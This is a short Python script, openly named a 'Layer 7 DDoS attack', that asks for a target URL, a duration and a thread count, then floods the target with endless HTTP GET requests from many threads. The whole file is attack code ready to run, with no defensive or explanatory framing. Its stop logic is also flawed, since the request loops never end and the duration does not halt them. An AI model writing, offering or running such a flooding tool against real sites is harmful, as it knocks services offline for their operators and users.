import requests
import threading
import time

# Function to send HTTP requests without printing response
def send_request(target_url):
    while True:
        try:
            requests.get(target_url)
        except requests.RequestException as e:
            print(f"Request failed: {e}")

# Function to start the attack
def start_attack(target_url, duration, num_threads):
    end_time = time.time() + duration
    threads = []
    
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(target_url,))
        thread.start()
        threads.append(thread)

    # Wait until the end time
    while time.time() < end_time:
        pass
    
    # Stop threads
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    duration = int(input("Enter attack duration in seconds: "))
    num_threads = int(input("Enter number of threads: "))

    print(f"Starting Layer 7 DDoS attack on {target_url} with {num_threads} threads...")

    # Start the attack
    start_attack(target_url, duration, num_threads)
